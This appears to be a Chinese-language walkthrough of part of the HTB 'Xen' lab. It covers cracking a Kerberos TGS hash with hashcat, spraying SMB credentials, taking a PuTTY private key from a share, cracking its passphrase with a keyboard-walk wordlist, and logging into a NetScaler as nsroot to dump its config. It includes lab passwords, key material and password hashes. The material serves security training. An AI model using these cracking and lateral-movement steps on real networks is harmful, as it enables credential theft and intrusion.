7a98fdef184088e05498f9e732dfd5aaf66aeb8c2fe9133900be31dd409d154489835152a2917f1b5ab8cbbbee6aedf1eb4424814b657a35b76412a31c4f161d9c7bd9d4ec5c04d700b087422c8dc1e4d4ecc170519c44fb2a0a7cbe9b143a8eb75e0d5eede8ee6696ff0cd8a216466b4f9572dc9c8560e1b13a2f57387d27dd232da99c30f8609ce8fe1fd505fb7a66eba923839238e9dc5ca875d0fb6f98cd7c54a59c546bd308ab749f8fbb5413cc2d5860ac06dcee3ec64f4892f948585156dd3e2f7dfd97ea37346ed735c8ca931b1c87826833af1e838e95161abbfcfaa07b10d9d3a568c6daae5d3118cd10e448f789257f23fbdf3191163e9f2bbf666b2d06a49b8a9571dbe0073325511947fb609372e241abb921d2cb4cf4bc7eb28e93aed0d4c2fc6e90a6f6b8134e88c761422178594f80de4d1630d5fdbe1a9313c23910098576ca57460c322be0e4349140371eb44eb1426231e81f9ba044081348d825f4c50a3b0b7ac4ae97583dc70e05183485d7ad92bb01cea7067f24489c6f08f9745ea7c5e13b5838afd698e59b7ebda377f171aca6029da48566b0512031dfe832f5d7fb5d4e9c1d2a145e558fd739c33d305ef46ba0d857bbdaba69e8935d5c1beac52610a82b703e915d017005a3c39d153e175b5b84eeb257b8152fc614802f5a
```

### hashcat
#### rockyou(失败)
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/xen]
└─# hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*mturner$HTB.LOCAL$HTB.LOCAL/mturner*$5...802f5a
Time.Started.....: Wed Mar 18 15:56:22 2026 (9 secs)
Time.Estimated...: Wed Mar 18 15:56:31 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1500.3 kH/s (2.21ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...:  kristenanne -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#01.: Util: 78%

Started: Wed Mar 18 15:56:21 2026
Stopped: Wed Mar 18 15:56:33 2026

┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/xen]
└─# hashcat --show -m 13100 hash


```

没跑出来，尝试了几个其它规则变型也没跑出来

#### T0XlC.rule(失败)
```plain
┌──(kali㉿kali)-[~/Desktop/htb/xen]
└─$ hashcat -m 13100 -a 0 -r /usr/share/hashcat/rules/T0XlC.rule hash /usr/share/wordlists/rockyou.txt --force
hashcat (v7.1.2) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 7 6800HS with Radeon Graphics, 2930/5861 MB (1024 MB allocatable), 4MCU

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 58596812725
```

没跑出来

#### dive.rule
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/xen]
└─# hashcat -m 13100 -a 0 -r /usr/share/hashcat/rules/dive.rule hash /usr/share/wordlists/rockyou.txt --force
hashcat (v7.1.2) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 7 6800HS with Radeon Graphics, 2930/5861 MB (1024 MB allocatable), 4MCU

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 1415360467950

$krb5tgs$23$*mturner$HTB.LOCAL$HTB.LOCAL/mturner*$5c17780201e65e27034f8709b035251f$daafb272f69acbadafbdf13984099d3927ee1f74143ee140ad1fb4f6c8faee3da445afee18fa9969ab7268d42c3541693b13833d031451771b5e5cb8a252f8c1216be45bfa89ac221f40ac9ffab491a9a9f9e68d963e4133971e849b922e06547e35502fe5707bf158ad6f111e6ea0eaa456d904c522fdabb957553066a9da86c7043fc3e8c0e201def18f0b33aaa1b8763b95e21a1e2233b246e0c4480c73897c777595e507d327476a60d3a2c5bb53142564e975d70d1feae6d2599235c502ecb92b6860d3560fbcde6b80c1b29666597ca70e36343bd0e9c9cbf3c238e9eb2754dbafe0d4845350c1211e8ae96c92d0b81574df9704b657ad74585498e4ee1b1d7625078e566c09b859496e272274bacb858fce0c6145bcac919cf4a3c28ccfefbef9dca012a990363cb187ea93c5601868e13367f616aa2a05c2e57767481f9444000049c75b4483375c5a626fa14ad0f683812f6fe298c00d65768ca865aaba1f9d2451b9d533399a110adb652f78a67e19292cdcdc00473059a3d871658ff91b2dfced81ba4c5f7c050e5a03c4997b80778a48663ffe9031b5ae7e654b08a68d5740ee2d6d167286c7a6f89282d929936191f40328a97cd77a98fdef184088e05498f9e732dfd5aaf66aeb8c2fe9133900be31dd409d154489835152a2917f1b5ab8cbbbee6aedf1eb4424814b657a35b76412a31c4f161d9c7bd9d4ec5c04d700b087422c8dc1e4d4ecc170519c44fb2a0a7cbe9b143a8eb75e0d5eede8ee6696ff0cd8a216466b4f9572dc9c8560e1b13a2f57387d27dd232da99c30f8609ce8fe1fd505fb7a66eba923839238e9dc5ca875d0fb6f98cd7c54a59c546bd308ab749f8fbb5413cc2d5860ac06dcee3ec64f4892f948585156dd3e2f7dfd97ea37346ed735c8ca931b1c87826833af1e838e95161abbfcfaa07b10d9d3a568c6daae5d3118cd10e448f789257f23fbdf3191163e9f2bbf666b2d06a49b8a9571dbe0073325511947fb609372e241abb921d2cb4cf4bc7eb28e93aed0d4c2fc6e90a6f6b8134e88c761422178594f80de4d1630d5fdbe1a9313c23910098576ca57460c322be0e4349140371eb44eb1426231e81f9ba044081348d825f4c50a3b0b7ac4ae97583dc70e05183485d7ad92bb01cea7067f24489c6f08f9745ea7c5e13b5838afd698e59b7ebda377f171aca6029da48566b0512031dfe832f5d7fb5d4e9c1d2a145e558fd739c33d305ef46ba0d857bbdaba69e8935d5c1beac52610a82b703e915d017005a3c39d153e175b5b84eeb257b8152fc614802f5a:4install!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*mturner$HTB.LOCAL$HTB.LOCAL/mturner*$5...802f5a
Time.Started.....: Wed Mar 18 16:03:56 2026, (2 hours, 17 mins)
Time.Estimated...: Wed Mar 18 18:21:08 2026, (0 secs)
Kernel.Feature...: Optimized Kernel (password length 0-31 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/dive.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1030.0 kH/s (23.78ms) @ Accel:23 Loops:256 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8772561054/1415360467950 (0.62%)
Rejected.........: 98670/8772561054 (0.00%)
Restore.Point....: 88873/14344385 (0.62%)
Restore.Sub.#01..: Salt:0 Amplifier:37376-37632 Iteration:0-256
Candidate.Engine.: Device Generator
Candidates.#01...: jefjef -> 9imoveu18
Hardware.Mon.#01.: Util: 90%

Started: Wed Mar 18 16:03:55 2026
Stopped: Wed Mar 18 18:21:10 2026
```

#### 凭据
```plain
hashcat --show -m 13100 hash
```

获得新凭证：mturner / 4install！

### netexec
```plain
┌──(kali㉿kali)-[~]
└─$ proxychains -q netexec smb 172.16.249.1/24 -u mturner -p '4install!' --shares
SMB         172.16.249.204  445    VDESKTOP2        [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:VDESKTOP2) (domain:htb.local) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         172.16.249.201  445    CITRIX           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:CITRIX) (domain:htb.local) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         172.16.249.200  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:htb.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.249.204  445    VDESKTOP2        [+] htb.local\mturner:4install!
SMB         172.16.249.201  445    CITRIX           [+] htb.local\mturner:4install!
SMB         172.16.249.204  445    VDESKTOP2        [*] Enumerated shares
SMB         172.16.249.204  445    VDESKTOP2        Share           Permissions     Remark
SMB         172.16.249.204  445    VDESKTOP2        -----           -----------     ------
SMB         172.16.249.204  445    VDESKTOP2        ADMIN$                          Remote Admin
SMB         172.16.249.204  445    VDESKTOP2        C$                              Default share
SMB         172.16.249.204  445    VDESKTOP2        IPC$                            Remote IPC
SMB         172.16.249.200  445    DC               [+] htb.local\mturner:4install!
SMB         172.16.249.201  445    CITRIX           [*] Enumerated shares
SMB         172.16.249.201  445    CITRIX           Share           Permissions     Remark
SMB         172.16.249.201  445    CITRIX           -----           -----------     ------
SMB         172.16.249.201  445    CITRIX           ADMIN$                          Remote Admin
SMB         172.16.249.201  445    CITRIX           C$                              Default share
SMB         172.16.249.201  445    CITRIX           Citrix$         READ
SMB         172.16.249.201  445    CITRIX           IPC$                            Remote IPC
SMB         172.16.249.201  445    CITRIX           ISOs
SMB         172.16.249.201  445    CITRIX           ISOs-TEST
SMB         172.16.249.200  445    DC               [*] Enumerated shares
SMB         172.16.249.200  445    DC               Share           Permissions     Remark
SMB         172.16.249.200  445    DC               -----           -----------     ------
SMB         172.16.249.200  445    DC               ADMIN$                          Remote Admin
SMB         172.16.249.200  445    DC               C$                              Default share
SMB         172.16.249.200  445    DC               IPC$            READ            Remote IPC
SMB         172.16.249.200  445    DC               NETLOGON        READ            Logon server share
SMB         172.16.249.200  445    DC               SYSVOL          READ            Logon server share
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

> SMB         172.16.249.201  445    CITRIX           Citrix$         READ
>

发现可读SMB目录

# Citrix-172.16.249.201
 用 mturner 账号登录 CITRIX 主机的 citrix$ 共享  

```plain
C:\Windows\system32>net use \\citrix\citrix$ /u:mturner 4install!
net use \\citrix\citrix$ /u:mturner 4install!
The command completed successfully.

C:\Windows\system32>dir \\citrix\citrix$
dir \\citrix\citrix$
 Volume in drive \\citrix\citrix$ has no label.
 Volume Serial Number is 244B-E63F

 Directory of \\citrix\citrix$

05/09/2019  06:12 AM    <DIR>          .
05/09/2019  06:12 AM    <DIR>          ..
02/13/2019  07:21 AM           997,001 Deploying-XenServer-5.6.pdf
03/31/2019  11:25 PM                20 flag.txt
05/09/2019  06:21 AM             1,486 private.ppk
02/13/2019  07:21 AM         1,747,587 XenServer-5-6-SHG.pdf
               4 File(s)      2,746,094 bytes
               2 Dir(s)  24,810,258,432 bytes free
```

## Getflag
```plain
C:\Windows\system32>type \\citrix\citrix$\flag.txt
type \\citrix\citrix$\flag.txt
XEN{l364cy_5pn5_ftw}
```

## smbclient(失败)
```plain
┌──(kali㉿kali)-[~/Desktop/htb/xen]
└─$ proxychains -q smbclient '//172.16.249.201/citrix$' -U 'mturner' --password='4install!'
session setup failed: NT_STATUS_LOGON_FAILURE
```

搞不懂为什么失败了，可能是smbclient 的协议协商/认证机制问题

换成impacket-smbclient 这个对老系统兼容性更好

## impacket-smbclient
```plain
proxychains -q impacket-smbclient 'mturner:4install!@172.16.249.201'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# shares
ADMIN$
C$
Citrix$
IPC$
ISOs
ISOs-TEST
# use Citrix$
# ls
drw-rw-rw-          0  Thu May  9 06:12:51 2019 .
drw-rw-rw-          0  Thu May  9 06:12:51 2019 ..
-rw-rw-rw-     997001  Thu Feb 14 07:33:28 2019 Deploying-XenServer-5.6.pdf
-rw-rw-rw-         20  Sun Mar 31 23:25:29 2019 flag.txt
-rw-rw-rw-       1486  Thu May  9 06:22:10 2019 private.ppk
-rw-rw-rw-    1747587  Sun Mar 31 23:25:46 2019 XenServer-5-6-SHG.pdf
# get Deploying-XenServer-5.6.pdf
# get XenServer-5-6-SHG.pdf
# get private.ppk
```

## private.ppk
private.ppk是：**PuTTY 私钥（SSH 私钥）**

```plain
┌──(kali㉿kali)-[~/Desktop/htb/xen]
└─$ cat private.ppk
PuTTY-User-Key-File-2: ssh-rsa
Encryption: aes256-cbc
Comment: imported-openssh-key
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQDR1rakYMB+9++bNXo/Rda/7dhII8lzQt+n
ixND2S30rtBz+ROW/UqKqTX8lRZ3zlMFKQT514RomVq0ec6gEoKVGZQRsc+S4aaL
AAnLp4ENGT3Gk9AeHgDxJ2eyBFnzMmO07gInwFzEPCLTT7caJAYGuMFdxgAsU6BX
Y49Tv578krpGNz0C58V6YH+u8/AIVXfhmXdwGuY921NDUHogjRGsoxQi9jDffOx+
zOuxfm7nMRYGDWLZO5HNjhanQt0rj9EK+70zJcFb1CDub9EEmwb/DDZB5zCytx90
69mql7SFg7D0K1tm0LicrwZMDJuYf87P5MFdBEnsO3Oay1lsRFZz
Private-Lines: 14
LbxnKlBkUZLxSGo2vSU375iM6kDpQuIE8S5G+azqGT0FziA/lr40gyj2IipKZqe/
DZRbPNcrerJQDE9xg1qTqnKShjnRvUi+I5ClTvn7UrYt2HAfds/Tl61zRhJ3YXnu
dkw3fTfo63OvBPwRpYQtpj5yFbHtUR8wY+2RBNcS/plU2kretGTRbZJkV9+1U7Vz
Uk2JZfua5VkTuCw7DqKRoAjR28p1UKhpIoztG6MKtNtR1HeUL3y2oQbOzLNJhz0m
F9sn/wBTdPQN5ZB76ERlH0fAugi7YeuxwFxctnUNoeA3+APH3kzeP9uRLsBwdn0r
ayZr/yihzFMlQ7VgcjI9uE2sMnScaEk094FWuj6gjPZqoqzAWhXP/71VEWbOg+gj
s6nBhJB9f4mUEHy8SOlbIK/Q3Es/VAaYiQchSXEsPhHdGC2J511TudjggmCFsCVP
tf6mzyS+8SA23dE8L3V5S5/Y8IDEcvLWaxDsV6Xjd4PGBgMLp10FJYajo9m61GdB
4ffBBqI5sOZK0Gb27AemRSyo0vA5EoM3YUOeKqm5xlNIalrTHI10SKD9tTC8UPLJ
1fbbmJ+eQagw/PefzHQ9cavnU5x98+PjeougVBbkZBGBAqUP0cLV1hWKaOlkqHP5
+m+fLhviWCbNj2FNEFse04NNlbSBgHrF//fVQbFIbSnMsJ/BkDZ5rVxpHG8aq9my
l9a0d97470iNp8drQKuKGRlzbe/TA8NQQaO5/My28kPbLqLcaTJKNZe8rvvU4Cj4
n+76s8XHhONvtAUrULiGHyAM2aMQXwUM5rCju7t6hdpy5h8HTgdys35MRM2DdvtD
+SfIoAmXu1V1xQrQJbDlStVM9l5z6C+pzmtv26jXebl8821pI6xJJHW02dZDAskl
Private-MAC: 27a161c329fc67b51d27efcaf3221099748934a9
```

> PuTTY-User-Key-File-2: ssh-rsa  
Encryption: aes256-cbc
>
> 说明该秘钥是 RSA 私钥 并且经过**加密的（需要密码）因此 不能直接用  **
>

### kwprocessor
[https://github.com/hashcat/kwprocessor](https://github.com/hashcat/kwprocessor)

这个工具在打RastaLabs时曾使用过，用来生成符合键盘走位习惯的字典

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/kwprocessor]
└─# ./kwp -z basechars/full.base ./keymaps/en.keymap routes/2-to-16-max-3-direction-changes.route > /usr/share/wordlists/kwp.txt
```

### putty2john
```plain
┌──(kali㉿kali)-[~/Desktop/htb/xen]
└─$ putty2john private.ppk > private.john
```

### john
```plain
┌──(kali㉿kali)-[~/Desktop/htb/xen]
└─$ john private.john --wordlist=/usr/share/wordlists/kwp.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PuTTY, Private Key (RSA/DSA/ECDSA/ED25519) [SHA1/AES 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
=-09876567890-=- (private)
1g 0:00:00:04 DONE (2026-03-18 17:05) 0.2083g/s 266240p/s 266240c/s 266240C/s `1234567^%$#45678..poiuytrewsxSW
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

得到密码=-09876567890-=-

### puttygen
使用工具puttygen转换私钥

键入密码=-09876567890-=-

```plain
puttygen private.ppk -O private-openssh -o private.pem
```

根据之前在win7靶机内网探测出linux主机172.16.249.202，我们尝试根据所得秘钥登录

# Linux-172.16.249.202
## 证书赋权
```plain
chmod 600 private.pem
```

## ssh登录
```plain
proxychains -q ssh -i private.pem mturner@172.16.249.202
```

键入证书密码'=-09876567890-=-'和mturner密码'4install!'成功登录，不过证书好像并不是mturner的

## NetScaler
ssh登录成功后我们 获得了一个受限的shell

```plain
> help

   NetScaler command-line interface

   Try :
     'help <commandName>' for full usage of a specific command
     'help <groupName>'   for brief usage of a group of commands
     'help -all'          for brief usage of all CLI commands
     'man <commandName>'  for a complete command description

     '?' will show possible completions in the current context

  The command groups are:
        basic                   app                     aaa                     appflow                 appfw                   appqoe                  audit
        authentication          authorization           autoscale               bfd                     ca                      cache                   cli
        cloud                   cluster                 cmp                     feo                     cr                      cs                      db
        dns                     dos                     event                   filter                  gslb                    HA                      ica
        ipsec                   ipsecalg                lb                      lsn                     network                 ns                      ntp
        policy                  pq                      protocol                qos                     rdp                     responder               rewrite
        rise                    router                  snmp                    spillover               sc                      ssl                     stream
        system                  subscriber              tm                      transform               tunnel                  utility                 vpn
        wi                      wf                      smpp                    lldp                    mediaclassifica         ulfd                    reputation
        pcp                     urlfiltering            videooptimizati         adaptivetcp             user
 Done
```

根据help显示我们得知这是一台NetScaler设备，通过google搜索得知该设备管理员账号为`**nsroot**`

> [NetScaler](https://www.google.com/search?client=firefox-b-d&q=NetScaler&mstk=AUtExfDXh3VJwtR0knxh3M4NVfiQbbwsHwFzm5BkUrlm6PE_jRFEYyLE9hDwQFch9MQefUrthrnSA51EXEY0zjGNEpbAwOfhf76vjxt5gxGmKZzHNDImfgnZ7crm4KkpNQwp37g&csui=3&ved=2ahUKEwjW4OPbg6mTAxV43TgGHfIcEZsQgK4QegYIAQgAEAU) （前身为 Citrix ADC）是一个全面的应用交付和安全平台，可优化、保护和管理跨混合云和多云环境的网络流量它提供负载均衡、流量管理和 Web 应用防火墙 (WAF) 服务，确保为企业用户提供快速、安全的应用交付。
>

## nsroot
```plain
┌──(kali㉿kali)-[~/Desktop/htb/xen]
└─$ proxychains -q ssh -i private.pem nsroot@172.16.249.202
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
###############################################################################
#                                                                             #
#        WARNING: Access to this system is for authorized users only          #
#         Disconnect IMMEDIATELY if you are not an authorized user!           #
#                                                                             #
###############################################################################

Enter passphrase for key 'private.pem':
Last login: Wed Mar 18 08:27:12 2026 from 172.16.249.204
 Done
>
```

## show runningConfig
```plain
> show runningConfig
#NS12.0 Build 56.20
# Last modified Wed Mar 18 08:41:02 2026
set ns config -IPAddress 172.16.249.202 -netmask 255.255.255.0
enable ns feature WL CH
enable ns mode FR L3 Edge USNIP PMTUD
set system parameter -doppler DISABLED
set system user nsroot 2a959aeb1324f99d7dbc12496adafa0363771c50face17e09ef43053725f4d78b97dd4f37752c483426264ecbb295911185d1ed9c715a5786229e074ab7cee49040530c41 -encrypted -hashmethod SHA512
set rsskeytype -rsstype ASYMMETRIC
set lacp -sysPriority 32768 -mac 00:50:56:94:00:75
set ns hostName netscaler
set interface 0/1 -throughput 0 -bandwidthHigh 0 -bandwidthNormal 0 -intftype "XEN Interface" -ifnum 0/1
set interface LO/1 -haMonitor OFF -haHeartbeat OFF -throughput 0 -bandwidthHigh 0 -bandwidthNormal 0 -intftype Loopback -ifnum LO/1
add ns ip6 fe80::250:56ff:fe8f:2fe8/64 -scope link-local -type NSIP -vlan 1 -vServer DISABLED -mgmtAccess ENABLED -dynamicRouting ENABLED
set nd6RAvariables -vlan 1
set snmp alarm APPFW-BUFFER-OVERFLOW -timeout 1
set snmp alarm APPFW-COOKIE -timeout 1
set snmp alarm APPFW-CSRF-TAG -timeout 1
set snmp alarm APPFW-DENY-URL -timeout 1
set snmp alarm APPFW-FIELD-CONSISTENCY -timeout 1
set snmp alarm APPFW-FIELD-FORMAT -timeout 1
set snmp alarm APPFW-POLICY-HIT -timeout 1
set snmp alarm APPFW-REFERER-HEADER -timeout 1
set snmp alarm APPFW-SAFE-COMMERCE -timeout 1
set snmp alarm APPFW-SAFE-OBJECT -timeout 1
set snmp alarm APPFW-SESSION-LIMIT -timeout 1
set snmp alarm APPFW-SQL -timeout 1
set snmp alarm APPFW-START-URL -timeout 1
set snmp alarm APPFW-VIOLATIONS-TYPE -timeout 1
set snmp alarm APPFW-XML-ATTACHMENT -timeout 1
set snmp alarm APPFW-XML-DOS -timeout 1
set snmp alarm APPFW-XML-SCHEMA-COMPILE -timeout 1
set snmp alarm APPFW-XML-SOAP-FAULT -timeout 1
set snmp alarm APPFW-XML-SQL -timeout 1
set snmp alarm APPFW-XML-VALIDATION -timeout 1
set snmp alarm APPFW-XML-WSI -timeout 1
set snmp alarm APPFW-XML-XSS -timeout 1
set snmp alarm APPFW-XSS -timeout 1
set snmp alarm CLUSTER-BACKPLANE-HB-MISSING -time 86400 -timeout 86400
set snmp alarm CLUSTER-NODE-HEALTH -time 86400 -timeout 86400
set snmp alarm CLUSTER-NODE-QUORUM -time 86400 -timeout 86400
set snmp alarm CLUSTER-VERSION-MISMATCH -time 86400 -timeout 86400
set snmp alarm COMPACT-FLASH-ERRORS -time 86400 -timeout 86400
set snmp alarm CONFIG-CHANGE -timeout 86400
set snmp alarm CONFIG-SAVE -timeout 86400
set snmp alarm HA-BAD-SECONDARY-STATE -time 86400 -timeout 86400
set snmp alarm HA-NO-HEARTBEATS -time 86400 -timeout 86400
set snmp alarm HA-SYNC-FAILURE -time 86400 -timeout 86400
set snmp alarm HA-VERSION-MISMATCH -time 86400 -timeout 86400
set snmp alarm HARD-DISK-DRIVE-ERRORS -time 86400 -timeout 86400
set snmp alarm HA-STATE-CHANGE -timeout 86400
set snmp alarm HA-STICKY-PRIMARY -timeout 86400
set snmp alarm PORT-ALLOC-FAILED -time 3600 -timeout 3600
set snmp alarm SYNFLOOD -timeout 1
bind policy patset ns_vpn_client_useragents AGEE -index 1 -charset ASCII
bind policy patset ns_vpn_client_useragents CitrixReceiver -index 2 -charset ASCII
bind policy patset ns_vpn_client_useragents AGMacClient -index 3 -charset ASCII
bind policy patset ns_vpn_client_useragents "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0" -index 4 -charset ASCII
bind policy patset ns_vpn_client_useragents "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0" -index 5 -charset ASCII
bind policy patset ns_aaa_activesync_useragents Apple-iPhone -index 1 -charset ASCII
bind policy patset ns_aaa_activesync_useragents Apple-iPad -index 2 -charset ASCII
bind policy patset ns_aaa_activesync_useragents SAMSUNG-GT -index 3 -charset ASCII
bind policy patset ns_aaa_activesync_useragents "SAMSUNG GT" -index 4 -charset ASCII
bind policy patset ns_aaa_activesync_useragents AirWatch -index 5 -charset ASCII
bind policy patset ns_aaa_activesync_useragents "TouchDown(MSRPC)" -index 6 -charset ASCII
bind policy patset ns_videoopt_quic_abr_sni_whitelist googlevideo.com -index 1
bind policy patset ns_videoopt_quic_abr_sni_whitelist c.youtube.com -index 2
bind policy patset ns_videoopt_quic_abr_sni_blacklist manifest.googlevideo.com -index 1
bind policy patset ns_videoopt_quic_abr_sni_blacklist redirector.googlevideo.com -index 2
add ns tcpProfile nsulfd_default_profile -WS ENABLED -SACK ENABLED -WSVal 8 -maxBurst 10 -initialCwnd 6 -oooQSize 100 -pktPerRetx 3 -minRTO 200 -sendBuffsize 2097152 -rstMaxAck ENABLED -spoofSynDrop DISABLED -tcpmode ENDPOINT
set cmp parameter -policyType ADVANCED
add ssl certKey ns-server-certificate -cert ns-server.cert -key ns-server.key
add authentication ldapAction 172.16.249.200 -serverIP 172.16.249.200 -ldapBase "DC=HTB,DC=LOCAL" -ldapBindDn "CN=netscaler-svc,OU=Service Accounts,DC=HTB,DC=LOCAL" -ldapBindDnPassword de965bf774348634d64c6184ee5aeb18a71a17e6ada3ce276758c01a36c366ba -encrypted -encryptmethod ENCMTHD_3 -ldapLoginName sAMAccountName -groupAttrName memberOf -subAttributeName cn
add authentication ldapPolicy LDAP-Policy ns_true 172.16.249.200
set lb parameter -sessionsThreshold 150000
set cache parameter -via "NS-CACHE-10.0: 202"
set aaa parameter -maxAAAUsers 5
set ns rpcNode 172.16.249.202 -password 1685ead5159743b00482fc955a35c5e0d896e312e5c747b569abd2e07f658ba147a8956e67515a2fe19e5bd3e46254b9 -encrypted -encryptmethod ENCMTHD_3 -srcIP 172.16.249.202
bind cmp global ns_adv_nocmp_xml_ie -priority 8700 -gotoPriorityExpression END -type RES_DEFAULT
bind cmp global ns_adv_nocmp_mozilla_47 -priority 8800 -gotoPriorityExpression END -type RES_DEFAULT
bind cmp global ns_adv_cmp_mscss -priority 8900 -gotoPriorityExpression END -type RES_DEFAULT
bind cmp global ns_adv_cmp_msapp -priority 9000 -gotoPriorityExpression END -type RES_DEFAULT
bind cmp global ns_adv_cmp_content_type -priority 10000 -gotoPriorityExpression END -type RES_DEFAULT
set appflow param -cqaReporting ENABLED
add cache contentGroup DEFAULT
set cache contentGroup NSFEO -maxResSize 1994752
add cache contentGroup BASEFILE -relExpiry 86000 -weakNegRelExpiry 600 -maxResSize 256 -memLimit 2
add cache contentGroup DELTAJS -relExpiry 86000 -weakNegRelExpiry 600 -insertAge NO -maxResSize 256 -memLimit 1 -pinned YES
add cache contentGroup ctx_cg_poc -relExpiry 86000 -weakNegRelExpiry 600 -insertAge NO -maxResSize 500 -memLimit 256 -pinned YES
add cache policy _nonGetReq -rule "!HTTP.REQ.METHOD.eq(GET)" -action NOCACHE
add cache policy _advancedConditionalReq -rule "HTTP.REQ.HEADER(\"If-Match\").EXISTS || HTTP.REQ.HEADER(\"If-Unmodified-Since\").EXISTS" -action NOCACHE
add cache policy _personalizedReq -rule "HTTP.REQ.HEADER(\"Cookie\").EXISTS || HTTP.REQ.HEADER(\"Authorization\").EXISTS || HTTP.REQ.HEADER(\"Proxy-Authorization\").EXISTS || HTTP.REQ.IS_NTLM_OR_NEGOTIATE" -action MAY_NOCACHE
add cache policy _uncacheableStatusRes -rule "! ((HTTP.RES.STATUS.EQ(200)) || (HTTP.RES.STATUS.EQ(304)) || (HTTP.RES.STATUS.BETWEEN(400,499)) || (HTTP.RES.STATUS.BETWEEN(300, 302)) || (HTTP.RES.STATUS.EQ(307))|| (HTTP.RES.STATUS.EQ(203)))" -action NOCACHE
add cache policy _uncacheableCacheControlRes -rule "((HTTP.RES.CACHE_CONTROL.IS_PRIVATE) || (HTTP.RES.CACHE_CONTROL.IS_NO_CACHE) || (HTTP.RES.CACHE_CONTROL.IS_NO_STORE) || (HTTP.RES.CACHE_CONTROL.IS_INVALID))" -action NOCACHE
add cache policy _cacheableCacheControlRes -rule "((HTTP.RES.CACHE_CONTROL.IS_PUBLIC) || (HTTP.RES.CACHE_CONTROL.IS_MAX_AGE) || (HTTP.RES.CACHE_CONTROL.IS_MUST_REVALIDATE) || (HTTP.RES.CACHE_CONTROL.IS_PROXY_REVALIDATE) || (HTTP.RES.CACHE_CONTROL.IS_S_MAXAGE))" -action CACHE -storeInGroup DEFAULT
add cache policy _uncacheableVaryRes -rule "((HTTP.RES.HEADER(\"Vary\").EXISTS) && ((HTTP.RES.HEADER(\"Vary\").INSTANCE(1).LENGTH > 0) || (!HTTP.RES.HEADER(\"Vary\").STRIP_END_WS.SET_TEXT_MODE(IGNORECASE).eq(\"Accept-Encoding\"))))" -action NOCACHE
add cache policy _uncacheablePragmaRes -rule "HTTP.RES.HEADER(\"Pragma\").EXISTS" -action NOCACHE
add cache policy _cacheableExpiryRes -rule "HTTP.RES.HEADER(\"Expires\").EXISTS" -action CACHE -storeInGroup DEFAULT
add cache policy _imageRes -rule "HTTP.RES.HEADER(\"Content-Type\").SET_TEXT_MODE(IGNORECASE).STARTSWITH(\"image/\")" -action CACHE -storeInGroup DEFAULT
add cache policy _personalizedRes -rule "HTTP.RES.HEADER(\"Set-Cookie\").EXISTS || HTTP.RES.HEADER(\"Set-Cookie2\").EXISTS" -action NOCACHE
add cache policy ctx_images -rule "HTTP.REQ.URL.SET_TEXT_MODE(IGNORECASE).CONTAINS_INDEX(\"ctx_file_extensions\").BETWEEN(101,150)" -action CACHE -storeInGroup ctx_cg_poc
add cache policy ctx_web_css -rule "HTTP.REQ.URL.ENDSWITH(\".css\")" -action CACHE -storeInGroup ctx_cg_poc
